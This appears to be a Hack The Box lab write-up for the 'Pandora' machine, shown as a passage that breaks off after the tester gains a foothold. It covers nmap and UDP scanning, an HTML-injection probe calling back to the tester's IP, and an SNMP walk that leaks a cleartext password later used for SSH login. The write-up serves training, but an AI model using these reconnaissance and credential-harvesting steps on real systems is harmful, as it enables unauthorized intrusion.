@@ -1,0 +1,916 @@
+<!doctype html><html lang=en><head><meta charset=utf-8><meta name=description content="HTB - Pandora  We first enumerate:
+1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  sudo nmap -sC -sV -oA pandora 10."><title>HTB - Pandora</title><meta name=viewport content="width=device-width,initial-scale=1"><link rel="shortcut icon" type=ico href=https://pietraferreira.github.io/quartz//favicon.ico><link href=https://pietraferreira.github.io/quartz/styles.591589daec716a7d5287f8d56c2c091e.min.css rel=stylesheet><link href=https://pietraferreira.github.io/quartz/styles/_light_syntax.86a48a52faebeaaf42158b72922b1c90.min.css rel=stylesheet id=theme-link><script src=https://pietraferreira.github.io/quartz/js/darkmode.a93be4d36d657139e957880e320dd457.min.js></script>
+<link rel=stylesheet href=https://cdn.jsdelivr.net/npm/katex@0.15.1/dist/katex.min.css integrity=sha384-R4558gYOUz8mP9YWpZJjofhk+zx0AS11p36HnD2ZKj/6JR5z27gSSULCNHIRReVs crossorigin=anonymous><script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.1/dist/katex.min.js integrity=sha384-z1fJDqw8ZApjGO3/unPWUPsIymfsJmyrDVWC8Tv/a1HeOtGmkwNd/7xUS0Xcnvsx crossorigin=anonymous></script>
+<script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.1/dist/contrib/auto-render.min.js integrity=sha384-+XBljXPPiv+OzfbB3cVmLHf4hdUFHlWNZN5spNQ7rmHTXpd7WvJum6fIACpNNfIR crossorigin=anonymous></script>
+<script src=https://unpkg.com/@floating-ui/core@0.7.3></script>
+<script src=https://unpkg.com/@floating-ui/dom@0.5.4></script>
+<script src=https://pietraferreira.github.io/quartz/js/popover.37b1455b8f0603154072b9467132c659.min.js></script>
+<script src=https://pietraferreira.github.io/quartz/js/code-title.b35124ad8db0ba37162b886afb711cbc.min.js></script>
+<script src=https://pietraferreira.github.io/quartz/js/clipboard.25155053855f45fdc48fd92540bcebc9.min.js></script>
+<script>const BASE_URL="https://pietraferreira.github.io/quartz/",fetchData=Promise.all([fetch("https://pietraferreira.github.io/quartz/indices/linkIndex.232db6e711fc8600f4d7ff9e1de10d0e.min.json").then(e=>e.json()).then(e=>({index:e.index,links:e.links})),fetch("https://pietraferreira.github.io/quartz/indices/contentIndex.d286afde09e2a2e3f9cc7764362fd233.min.json").then(e=>e.json())]).then(([{index:e,links:t},n])=>({index:e,links:t,content:n})),render=()=>{const n=new URL(BASE_URL),s=n.pathname,o=window.location.pathname,i=s==o;addCopyButtons(),addTitleToCodeBlocks();const e=document.getElementById("graph-container");if(!e)return requestAnimationFrame(render);e.textContent="";const t=i&&!1;drawGraph("https://pietraferreira.github.io/quartz",t,[{"/moc":"#4388cc"}],t?{centerForce:1,depth:-1,enableDrag:!0,enableLegend:!1,enableZoom:!0,fontSize:.5,linkDistance:1,opacityScale:3,repelForce:1,scale:1.4}:{centerForce:1,depth:1,enableDrag:!0,enableLegend:!1,enableZoom:!0,fontSize:.6,linkDistance:1,opacityScale:3,repelForce:2,scale:1.2}),initPopover("https://pietraferreira.github.io/quartz",!0,!0)},init=(e=document)=>{addCopyButtons(),addTitleToCodeBlocks(),renderMathInElement(e.body,{delimiters:[{left:"$$",right:"$$",display:!0},{left:"$",right:"$",display:!1}],throwOnError:!1})}</script><script type=module>
+    import { attachSPARouting } from "https:\/\/pietraferreira.github.io\/quartz\/js\/router.9d4974281069e9ebb189f642ae1e3ca2.min.js"
+    attachSPARouting(init, render)
+  </script></head><script async src="https://www.googletagmanager.com/gtag/js?id=G-XYFD95KB4J"></script>
+<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-XYFD95KB4J",{anonymize_ip:!1})}</script><body><div id=search-container><div id=search-space><input autocomplete=off id=search-bar name=search type=text aria-label=Search placeholder="Search for something..."><div id=results-container></div></div></div><script src=https://cdn.jsdelivr.net/npm/flexsearch@0.7.21/dist/flexsearch.bundle.js integrity="sha256-i3A0NZGkhsKjVMzFxv3ksk0DZh3aXqu0l49Bbh0MdjE=" crossorigin=anonymous defer></script>
+<script defer src=https://pietraferreira.github.io/quartz/js/search.cf33b507388f3dfd5513a2afcda7af41.min.js></script><div class=singlePage><header><h1 id=page-title><a href=https://pietraferreira.github.io/quartz/>🪅 Morioh</a></h1><div class=spacer></div><div id=search-icon><p>Search</p><svg tabindex="0" aria-labelledby="title desc" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 19.9 19.7"><title id="title">Search Icon</title><desc id="desc">Icon to open search</desc><g class="search-path" fill="none"><path stroke-linecap="square" d="M18.5 18.3l-5.4-5.4"/><circle cx="8" cy="8" r="7"/></g></svg></div><div class=darkmode><input class=toggle id=darkmode-toggle type=checkbox tabindex=-1>
+<label id=toggle-label-light for=darkmode-toggle tabindex=-1><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" id="dayIcon" viewBox="0 0 35 35" style="enable-background:new 0 0 35 35"><title>Light Mode</title><path d="M6 17.5C6 16.672 5.328 16 4.5 16h-3C.672 16 0 16.672.0 17.5S.672 19 1.5 19h3C5.328 19 6 18.328 6 17.5zM7.5 26c-.414.0-.789.168-1.061.439l-2 2C4.168 28.711 4 29.086 4 29.5 4 30.328 4.671 31 5.5 31c.414.0.789-.168 1.06-.44l2-2C8.832 28.289 9 27.914 9 27.5 9 26.672 8.329 26 7.5 26zm10-20C18.329 6 19 5.328 19 4.5v-3C19 .672 18.329.0 17.5.0S16 .672 16 1.5v3C16 5.328 16.671 6 17.5 6zm10 3c.414.0.789-.168 1.06-.439l2-2C30.832 6.289 31 5.914 31 5.5 31 4.672 30.329 4 29.5 4c-.414.0-.789.168-1.061.44l-2 2C26.168 6.711 26 7.086 26 7.5 26 8.328 26.671 9 27.5 9zM6.439 8.561C6.711 8.832 7.086 9 7.5 9 8.328 9 9 8.328 9 7.5c0-.414-.168-.789-.439-1.061l-2-2C6.289 4.168 5.914 4 5.5 4 4.672 4 4 4.672 4 5.5c0 .414.168.789.439 1.06l2 2.001zM33.5 16h-3c-.828.0-1.5.672-1.5 1.5s.672 1.5 1.5 1.5h3c.828.0 1.5-.672 1.5-1.5S34.328 16 33.5 16zM28.561 26.439C28.289 26.168 27.914 26 27.5 26c-.828.0-1.5.672-1.5 1.5.0.414.168.789.439 1.06l2 2C28.711 30.832 29.086 31 29.5 31c.828.0 1.5-.672 1.5-1.5.0-.414-.168-.789-.439-1.061l-2-2zM17.5 29c-.829.0-1.5.672-1.5 1.5v3c0 .828.671 1.5 1.5 1.5s1.5-.672 1.5-1.5v-3C19 29.672 18.329 29 17.5 29zm0-22C11.71 7 7 11.71 7 17.5S11.71 28 17.5 28 28 23.29 28 17.5 23.29 7 17.5 7zm0 18c-4.136.0-7.5-3.364-7.5-7.5s3.364-7.5 7.5-7.5 7.5 3.364 7.5 7.5S21.636 25 17.5 25z"/></svg></label><label id=toggle-label-dark for=darkmode-toggle tabindex=-1><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" id="nightIcon" viewBox="0 0 100 100" style="enable-background='new 0 0 100 100'"><title>Dark Mode</title><path d="M96.76 66.458c-.853-.852-2.15-1.064-3.23-.534-6.063 2.991-12.858 4.571-19.655 4.571C62.022 70.495 50.88 65.88 42.5 57.5 29.043 44.043 25.658 23.536 34.076 6.47c.532-1.08.318-2.379-.534-3.23-.851-.852-2.15-1.064-3.23-.534-4.918 2.427-9.375 5.619-13.246 9.491-9.447 9.447-14.65 22.008-14.65 35.369.0 13.36 5.203 25.921 14.65 35.368s22.008 14.65 35.368 14.65c13.361.0 25.921-5.203 35.369-14.65 3.872-3.871 7.064-8.328 9.491-13.246C97.826 68.608 97.611 67.309 96.76 66.458z"/></svg></label></div></header><article><h1>HTB - Pandora</h1><p class=meta>Last updated
+Jul 18, 2022</p><ul class=tags><li><a href=https://pietraferreira.github.io/quartz/tags/htb/>Htb</a></li><li><a href=https://pietraferreira.github.io/quartz/tags/writeup/>Writeup</a></li></ul><aside class=mainTOC><details><summary>Table of Contents</summary><nav id=TableOfContents></nav></details></aside><a href=#htb---pandora><h1 id=htb---pandora><span class=hanchor arialabel=Anchor># </span>HTB - Pandora</h1></a><hr><p>We first enumerate:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>sudo nmap -sC -sV -oA pandora 10.10.11.136
+</span></span><span class=line><span class=cl>Starting Nmap 7.92 <span class=o>(</span> https://nmap.org <span class=o>)</span> at 2022-07-18 11:02 BST
+</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 10.10.11.136
+</span></span><span class=line><span class=cl>Host is up <span class=o>(</span>0.034s latency<span class=o>)</span>.
+</span></span><span class=line><span class=cl>Not shown: <span class=m>998</span> closed tcp ports <span class=o>(</span>reset<span class=o>)</span>
+</span></span><span class=line><span class=cl>PORT   STATE SERVICE VERSION
+</span></span><span class=line><span class=cl>22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 <span class=o>(</span>Ubuntu Linux<span class=p>;</span> protocol 2.0<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=p>|</span> ssh-hostkey: 
+</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>3072</span> 24:c2:95:a5:c3:0b:3f:f3:17:3c:68:d7:af:2b:53:38 <span class=o>(</span>RSA<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>256</span> b1:41:77:99:46:9a:6c:5d:d2:98:2f:c0:32:9a:ce:03 <span class=o>(</span>ECDSA<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>_  <span class=m>256</span> e7:36:43:3b:a9:47:8a:19:01:58:b2:bc:89:f6:51:08 <span class=o>(</span>ED25519<span class=o>)</span>
+</span></span><span class=line><span class=cl>80/tcp open  http    Apache httpd 2.4.41 <span class=o>((</span>Ubuntu<span class=o>))</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>_http-title: Play <span class=p>|</span> Landing
+</span></span><span class=line><span class=cl><span class=p>|</span>_http-server-header: Apache/2.4.41 <span class=o>(</span>Ubuntu<span class=o>)</span>
+</span></span><span class=line><span class=cl>Service Info: OS: Linux<span class=p>;</span> CPE: cpe:/o:linux:linux_kernel
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span class=line><span class=cl>Nmap <span class=k>done</span>: <span class=m>1</span> IP address <span class=o>(</span><span class=m>1</span> host up<span class=o>)</span> scanned in 8.58 secon
+</span></span></code></pre></td></tr></table></div></div><p>So we have <strong>Apache 2.4.41</strong> on port 80 and <strong>SSH</strong> 8.2p1 on port 22, we are running Ubuntu.</p><p>Let&rsquo;s add it to our localhost by editing <code>/etc/hosts</code>, adding <code>pandora.htb</code> and checking the website out.</p><p>Let&rsquo;s try sending stuff using the form:</p><p><img src=https://pietraferreira.github.io/quartz//notes/images/Screenshot%20from%202022-07-18%2011-15-52.png width=auto alt></p><p>We also set up a <code>nc -lnvp 80</code>, but didn&rsquo;t really receive anything.</p><p>We get the url <code>http://pandora.htb/?fullName=hanato&email=hanato%40morioh.cool&phone=%2B885+1234+3244+987&message=%3Cimg+src%3D%22http%3A%2F%2F10.10.14.12%2Ftest%22%3E%3C%2Fimg%3E%3Ca+href%3D%22http%3A%2F%2F10.10.14.12%2F%22%3Eclick+here%3C%2Fa%3E</code>.</p><p>Let&rsquo;s gobust-it:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>gobuster dir -u http://10.10.11.136 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster.out
+</span></span></code></pre></td></tr></table></div></div><p>We can look at the UDP ports I guess, it will take a while though (around 10min):</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>sudo nmap -sU 10.10.11.136 -v
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Starting Nmap 7.92 <span class=o>(</span> https://nmap.org <span class=o>)</span> at 2022-07-18 11:41 BST
+</span></span><span class=line><span class=cl>Initiating Ping Scan at 11:41
+</span></span><span class=line><span class=cl>Scanning 10.10.11.136 <span class=o>[</span><span class=m>4</span> ports<span class=o>]</span>
+</span></span><span class=line><span class=cl>Completed Ping Scan at 11:41, 0.03s elapsed <span class=o>(</span><span class=m>1</span> total hosts<span class=o>)</span>
+</span></span><span class=line><span class=cl>Initiating UDP Scan at 11:41
+</span></span><span class=line><span class=cl>Scanning pandora.htb <span class=o>(</span>10.10.11.136<span class=o>)</span> <span class=o>[</span><span class=m>1000</span> ports<span class=o>]</span>
+</span></span><span class=line><span class=cl>Increasing send delay <span class=k>for</span> 10.10.11.136 from <span class=m>0</span> to <span class=m>50</span> due to max_successful_tryno increase to <span class=m>4</span>
+</span></span><span class=line><span class=cl>Increasing send delay <span class=k>for</span> 10.10.11.136 from <span class=m>50</span> to <span class=m>100</span> due to max_successful_tryno increase to <span class=m>5</span>
+</span></span><span class=line><span class=cl>Increasing send delay <span class=k>for</span> 10.10.11.136 from <span class=m>100</span> to <span class=m>200</span> due to max_successful_tryno increase to <span class=m>6</span>
+</span></span><span class=line><span class=cl>Increasing send delay <span class=k>for</span> 10.10.11.136 from <span class=m>200</span> to <span class=m>400</span> due to max_successful_tryno increase to <span class=m>7</span>
+</span></span><span class=line><span class=cl>Increasing send delay <span class=k>for</span> 10.10.11.136 from <span class=m>400</span> to <span class=m>800</span> due to max_successful_tryno increase to <span class=m>8</span>
+</span></span><span class=line><span class=cl>UDP Scan Timing: About 4.48% <span class=k>done</span><span class=p>;</span> ETC: 11:52 <span class=o>(</span>0:11:01 remaining<span class=o>)</span>
+</span></span><span class=line><span class=cl>Increasing send delay <span class=k>for</span> 10.10.11.136 from <span class=m>800</span> to <span class=m>1000</span> due to <span class=m>11</span> out of <span class=m>27</span> dropped probes since last increase.
+</span></span><span class=line><span class=cl>UDP Scan Timing: About 7.41% <span class=k>done</span><span class=p>;</span> ETC: 11:54 <span class=o>(</span>0:12:42 remaining<span class=o>)</span>
+</span></span><span class=line><span class=cl>UDP Scan Timing: About 25.33% <span class=k>done</span><span class=p>;</span> ETC: 11:57 <span class=o>(</span>0:11:59 remaining<span class=o>)</span>
+</span></span><span class=line><span class=cl>UDP Scan Timing: About 31.03% <span class=k>done</span><span class=p>;</span> ETC: 11:57 <span class=o>(</span>0:11:09 remaining<span class=o>)</span>
+</span></span><span class=line><span class=cl>UDP Scan Timing: About 36.83% <span class=k>done</span><span class=p>;</span> ETC: 11:57 <span class=o>(</span>0:10:19 remaining<span class=o>)</span>
+</span></span><span class=line><span class=cl>UDP Scan Timing: About 42.55% <span class=k>done</span><span class=p>;</span> ETC: 11:57 <span class=o>(</span>0:09:28 remaining<span class=o>)</span>
+</span></span><span class=line><span class=cl>UDP Scan Timing: About 48.17% <span class=k>done</span><span class=p>;</span> ETC: 11:57 <span class=o>(</span>0:08:38 remaining<span class=o>)</span>
+</span></span><span class=line><span class=cl>UDP Scan Timing: About 53.27% <span class=k>done</span><span class=p>;</span> ETC: 11:57 <span class=o>(</span>0:07:47 remaining<span class=o>)</span>
+</span></span><span class=line><span class=cl>UDP Scan Timing: About 58.48% <span class=k>done</span><span class=p>;</span> ETC: 11:57 <span class=o>(</span>0:06:56 remaining<span class=o>)</span>
+</span></span><span class=line><span class=cl>UDP Scan Timing: About 63.58% <span class=k>done</span><span class=p>;</span> ETC: 11:57 <span class=o>(</span>0:06:05 remaining<span class=o>)</span>
+</span></span><span class=line><span class=cl>Discovered open port 161/udp on 10.10.11.136
+</span></span></code></pre></td></tr></table></div></div><p>We got something in port <strong>161</strong> and according to
+<a href="https://www.speedguide.net/port.php?port=161" rel=noopener>this</a> it holds the <code>SNMP</code> service.</p><p>We can use <code>SNMPWalk</code> to collect SNMP information. SNMP (Simple Network Management Protocol) is a network monitoring protocol for seamless communication between multiple devices ona network, transmitting messages from the SNMP manager to the SNMP remote at each networking site (more
+<a href=https://www.solarwinds.com/resources/it-glossary/snmp-walk rel=noopener>here</a>).</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>snmpwalk -c public -v2c 10.10.11.136
+</span></span></code></pre></td></tr></table></div></div><ul><li><code>-c</code>: set the community string (default is public).</li><li><code>-v2c</code>: set version to 2c, which is the most common.</li></ul><p>It takes ages so we use this instead:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>snmpbulkwalk -c public -v2c 10.10.11.136 . &gt; snmpwalk.1
+</span></span></code></pre></td></tr></table></div></div><p>We can clean the file up:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>grep -oP <span class=s1>&#39;::.*?\.&#34;&#39;</span> snmpwalk.1 <span class=p>|</span> sort <span class=p>|</span> uniq -c <span class=p>|</span> sort -n
+</span></span></code></pre></td></tr></table></div></div><p>Then we can do:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>grep &lt;something&gt; snmpwalk.1 <span class=p>|</span> less -S
+</span></span><span class=line><span class=cl>grep hrSWRun snmpwalk.1 <span class=p>|</span> less -S
+</span></span></code></pre></td></tr></table></div></div><p>We found this:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>HOST-RESOURCES-MIB::hrSWRunParameters.823 <span class=o>=</span> STRING: <span class=s2>&#34;-c sleep 30; /bin/bash -c &#39;/usr/bin/host_check -u daniel -p HotelBabylon23&#39;&#34;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>HOST-RESOURCES-MIB::hrSWRunParameters.1117 <span class=o>=</span> STRING: <span class=s2>&#34;-u daniel -p HotelBabylon23&#34;</span>
+</span></span></code></pre></td></tr></table></div></div><p>It seems we a <code>daniel:HotelBabylon23</code> login:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>~/htb/pandora &gt; grep hrSWRun snmpwalk.1 <span class=p>|</span>grep <span class=m>823</span>                                                                                                                                                                                      1m 12s
+</span></span><span class=line><span class=cl>HOST-RESOURCES-MIB::hrSWRunIndex.823 <span class=o>=</span> INTEGER: <span class=m>823</span>
+</span></span><span class=line><span class=cl>HOST-RESOURCES-MIB::hrSWRunName.823 <span class=o>=</span> STRING: <span class=s2>&#34;sh&#34;</span>
+</span></span><span class=line><span class=cl>HOST-RESOURCES-MIB::hrSWRunID.823 <span class=o>=</span> OID: SNMPv2-SMI::zeroDotZero
+</span></span><span class=line><span class=cl>HOST-RESOURCES-MIB::hrSWRunPath.823 <span class=o>=</span> STRING: <span class=s2>&#34;/bin/sh&#34;</span>
+</span></span><span class=line><span class=cl>HOST-RESOURCES-MIB::hrSWRunParameters.823 <span class=o>=</span> STRING: <span class=s2>&#34;-c sleep 30; /bin/bash -c &#39;/usr/bin/host_check -u daniel -p HotelBabylon23&#39;&#34;</span>
+</span></span><span class=line><span class=cl>HOST-RESOURCES-MIB::hrSWRunType.823 <span class=o>=</span> INTEGER: application<span class=o>(</span>4<span class=o>)</span>
+</span></span><span class=line><span class=cl>HOST-RESOURCES-MIB::hrSWRunStatus.823 <span class=o>=</span> INTEGER: runnable<span class=o>(</span>2<span class=o>)</span>
+</span></span><span class=line><span class=cl>HOST-RESOURCES-MIB::hrSWRunPerfCPU.823 <span class=o>=</span> INTEGER: <span class=m>0</span>
+</span></span><span class=line><span class=cl>HOST-RESOURCES-MIB::hrSWRunPerfMem.823 <span class=o>=</span> INTEGER: <span class=m>604</span> KBytes
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>~/htb/pandora &gt; grep hrSWRun snmpwalk.1 <span class=p>|</span>grep <span class=m>1117</span>
+</span></span><span class=line><span class=cl>HOST-RESOURCES-MIB::hrSWRunIndex.1117 <span class=o>=</span> INTEGER: <span class=m>1117</span>
+</span></span><span class=line><span class=cl>HOST-RESOURCES-MIB::hrSWRunName.1117 <span class=o>=</span> STRING: <span class=s2>&#34;host_check&#34;</span>
+</span></span><span class=line><span class=cl>HOST-RESOURCES-MIB::hrSWRunID.1117 <span class=o>=</span> OID: SNMPv2-SMI::zeroDotZero
+</span></span><span class=line><span class=cl>HOST-RESOURCES-MIB::hrSWRunPath.1117 <span class=o>=</span> STRING: <span class=s2>&#34;/usr/bin/host_check&#34;</span>
+</span></span><span class=line><span class=cl>HOST-RESOURCES-MIB::hrSWRunParameters.1117 <span class=o>=</span> STRING: <span class=s2>&#34;-u daniel -p HotelBabylon23&#34;</span>
+</span></span><span class=line><span class=cl>HOST-RESOURCES-MIB::hrSWRunType.1117 <span class=o>=</span> INTEGER: application<span class=o>(</span>4<span class=o>)</span>
+</span></span><span class=line><span class=cl>HOST-RESOURCES-MIB::hrSWRunStatus.1117 <span class=o>=</span> INTEGER: runnable<span class=o>(</span>2<span class=o>)</span>
+</span></span><span class=line><span class=cl>HOST-RESOURCES-MIB::hrSWRunPerfCPU.1117 <span class=o>=</span> INTEGER: <span class=m>0</span>
+</span></span><span class=line><span class=cl>HOST-RESOURCES-MIB::hrSWRunPerfMem.1117 <span class=o>=</span> INTEGER: <span class=m>1360</span> KBytes
+</span></span></code></pre></td></tr></table></div></div><p>We ssh:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>~/htb/pandora &gt; ssh daniel@10.10.11.136                                
+</span></span><span class=line><span class=cl>The authenticity of host <span class=s1>&#39;10.10.11.136 (10.10.11.136)&#39;</span> can<span class=s1>&#39;t be established.
+</span></span></span><span class=line><span class=cl><span class=s1>ECDSA key fingerprint is SHA256:9urFJN3aRYRRc9S5Zc+py/w4W6hmZ+WLg6CyrY+5MDI.
+</span></span></span><span class=line><span class=cl><span class=s1>Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+</span></span></span><span class=line><span class=cl><span class=s1>Warning: Permanently added &#39;</span>10.10.11.136<span class=s1>&#39; (ECDSA) to the list of known hosts.
+</span></span></span><span class=line><span class=cl><span class=s1>daniel@10.10.11.136&#39;</span>s password: 
+</span></span><span class=line><span class=cl>Welcome to Ubuntu 20.04.3 LTS <span class=o>(</span>GNU/Linux 5.4.0-91-generic x86_64<span class=o>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl> * Documentation:  https://help.ubuntu.com
+</span></span><span class=line><span class=cl> * Management:     https://landscape.canonical.com
+</span></span><span class=line><span class=cl> * Support:        https://ubuntu.com/advantage
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>  System information as of Mon <span class=m>18</span> Jul 11:12:54 UTC <span class=m>2022</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>  System load:           0.09
+</span></span><span class=line><span class=cl>  Usage of /:            63.4% of 4.87GB
+</span></span><span class=line><span class=cl>  Memory usage:          8%
+</span></span><span class=line><span class=cl>  Swap usage:            0%
+</span></span><span class=line><span class=cl>  Processes:             <span class=m>231</span>
+</span></span><span class=line><span class=cl>  Users logged in:       <span class=m>0</span>
+</span></span><span class=line><span class=cl>  IPv4 address <span class=k>for</span> eth0: 10.10.11.136
+</span></span><span class=line><span class=cl>  IPv6 address <span class=k>for</span> eth0: dead:beef::250:56ff:feb9:f793
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>  <span class=o>=</span>&gt; /boot is using 91.8% of 219MB
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=m>0</span> updates can be applied immediately.
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>The list of available updates is more than a week old.
+</span></span><span class=line><span class=cl>To check <span class=k>for</span> new updates run: sudo apt update
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>The programs included with the Ubuntu system are free software<span class=p>;</span>
+</span></span><span class=line><span class=cl>the exact distribution terms <span class=k>for</span> each program are described in the
+</span></span><span class=line><span class=cl>individual files in /usr/share/doc/*/copyright.
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+</span></span><span class=line><span class=cl>applicable law.
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>daniel@pandora:~$
+</span></span></code></pre></td></tr></table></div></div><p>We can look into the webserver, <code>/var/www</code>.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>daniel@pandora:/var/www/pandora/pandora_console$ find . <span class=p>|</span> grep config.php
+</span></span></code></pre></td></tr></table></div></div><p>We get permission denied when trying to access <code>config.php</code>, only matt seems to have access:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>daniel@pandora:/var/www/pandora/pandora_console/include$ ls -la config.php 
+</span></span><span class=line><span class=cl>-rw------- <span class=m>1</span> matt matt <span class=m>413</span> Dec  <span class=m>3</span>  <span class=m>2021</span> config.php
